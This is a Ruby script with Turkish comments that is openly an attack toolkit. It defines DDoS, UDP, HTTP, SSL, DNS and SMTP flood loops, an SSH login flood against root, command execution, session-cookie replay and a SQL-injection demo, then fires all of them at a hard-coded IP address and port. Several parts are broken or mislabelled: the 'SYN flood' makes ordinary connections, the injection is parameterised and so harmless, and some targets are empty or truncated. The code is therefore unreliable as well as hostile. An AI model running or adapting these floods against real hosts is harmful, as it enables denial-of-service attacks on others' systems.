require 'socket'
require 'net/http'
require 'resolv'
require 'thread'
require 'open3'
require 'sqlite3'
require 'uri'
require 'net/ssh'
require 'net/smtp'

# Genel ayarlar
TARGET_IP = '185.22.184.174'
TARGET_PORT = 8087
TARGET_URL = ''
SESSION_ID = 'özelden'
EMAIL = 'tayfun@'
SENDER_EMAIL = 'burcu@'
NUM_THREADS = 100

# DDoS Saldırısı
def ddos_attack(target_url, num_threads)
  begin
    threads = []
    num_threads.times do
      threads << Thread.new do
        request_count = 0
        loop do
          Net::HTTP.get(URI(target_url))
          request_count += 1
          puts "DDoS saldırısı gönderiliyor... (İstek sayısı: #{request_count})" if request_count % 100 == 0
        end
      end
    end
    threads.each(&:join)
  rescue => e
    puts "DDoS saldırısı sırasında hata: #{e.message}"
  end
end

# SYN Flood
def syn_flood(target_ip, target_port)
  begin
    1000.times do
      socket = Socket.new(Socket::AF_INET, Socket::SOCK_STREAM, 0)
      sockaddr = Socket.sockaddr_in(target_port, target_ip)
      begin
        socket.connect(sockaddr)
      rescue Errno::ECONNREFUSED
        # Bağlantı reddedildi, devam et
      ensure
        socket.close
      end
      puts "SYN Flood gönderiliyor..."
    end
  rescue => e
    puts "SYN Flood sırasında hata: #{e.message}"
  end
end

# Komut Enjeksiyonu
def command_injection(command)
  begin
    stdout, stderr, status = Open3.capture3(command)
    puts "Çıktı: #{stdout}"
    puts "Hata: #{stderr}" if status.exitstatus != 0
  rescue => e
    puts "Komut enjeksiyonu sırasında hata: #{e.message}"
  end
end

# SQL Enjeksiyonu
def sql_injection(db, user_input)
  begin
    query = "SELECT * FROM users WHERE name = ?"
    db.execute(query, [user_input]).each do |row|
      puts "ID: #{row[0]}, Name: #{row[1]}"
    end
  rescue => e
    puts "SQL enjeksiyonu sırasında hata: #{e.message}"
  end
end

# Oturum Çalma
def session_hijacking(target_url, session_id)
  begin
    uri = URI(target_url)
    request = Net::HTTP::Get.new(uri)
    request['Cookie'] = "session_id=#{session_id}"
    response = Net::HTTP.start(uri.hostname, uri.port) do |http|
      http.request(request)
    end
    puts "Oturum çalma sonucu: #{response.body}"
  rescue => e
    puts "Oturum çalma sırasında hata: #{e.message}"
  end
end

# UDP Flood
def udp_flood(target_ip, target_port)
  begin
    socket = UDPSocket.new
    message = "UDP Flood Test"
    loop do
      socket.send(message, 0, target_ip, target_port)
      puts "UDP Flood gönderiliyor..."
    end
  rescue => e
    puts "UDP Flood sırasında hata: #{e.message}"
  ensure
    socket.close
  end
end

# HTTP Flood
def http_flood(target_url)
  begin
    uri = URI(target_url)
    loop do
      Net::HTTP.get(uri)
      puts "HTTP Flood gönderiliyor..."
    end
  rescue => e
    puts "HTTP Flood sırasında hata: #{e.message}"
  end
end

# SSH Flood
def ssh_flood(target_ip, user, password)
  begin
    1000.times do
      begin
        Net::SSH.start(target_ip, user, password: password) do |ssh|
          puts "SSH Flood gönderiliyor..."
        end
      rescue Net::SSH::AuthenticationFailed
        # Kimlik doğrulama hatası, devam et
      end
    end
  rescue => e
    puts "SSH Flood sırasında hata: #{e.message}"
  end
end

# DNS Flood
def dns_flood(target_dns)
  begin
    loop do
      Resolv::DNS.open do |dns|
        dns.getaddress('example.com')
        puts "DNS Flood gönderiliyor..."
      end
    end
  rescue => e
    puts "DNS Flood sırasında hata: #{e.message}"
  end
end

# SSL/TLS Flood
def ssl_tls_flood(target_url)
  begin
    uri = URI(target_url)
    loop do
      Net::HTTP.start(uri.host, uri.port, use_ssl: true) do |http|
        request = Net::HTTP::Get.new(uri)
        http.request(request)
        puts "SSL/TLS Flood gönderiliyor..."
      end
    end
  rescue => e
    puts "SSL/TLS Flood sırasında hata: #{e.message}"
  end
end

# SMTP Flood
def smtp_flood(target_email, sender_email)
  begin
    message = <<MESSAGE_END
From: Hacker <#{sender_email}>
To: Victim <#{target_email}>
Subject: SMTP Flood

Bu bir SMTP Flood saldırısıdır.
MESSAGE_END

    1000.times do
      Net::SMTP.start('smtp.example.com', 25) do |smtp|
        smtp.send_message message, sender_email, target_email
        puts "SMTP Flood gönderiliyor..."
      end
    end
  rescue => e
    puts "SMTP Flood sırasında hata: #{e.message}"
  end
end

# Fonksiyonları çağırma
ddos_attack(TARGET_URL, NUM_THREADS)
syn_flood(TARGET_IP, TARGET_PORT)
command_injection("ls -la")
db = SQLite3::Database.new ":memory:"
db.execute "CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT)"
db.execute "INSERT INTO users (name) VALUES (?)", ['Alice']
sql_injection(db, "Alice' OR '1'='1")
session_hijacking(TARGET_URL, SESSION_ID)
udp_flood(TARGET_IP, TARGET_PORT)
http_flood(TARGET_URL)
ssh_flood(TARGET_IP, 'root', 'password')
dns_flood('8.8.8.8')
ssl_tls_flood('https://www..com/auth/login')
smtp_flood(EMAIL, SENDER_EMAIL)
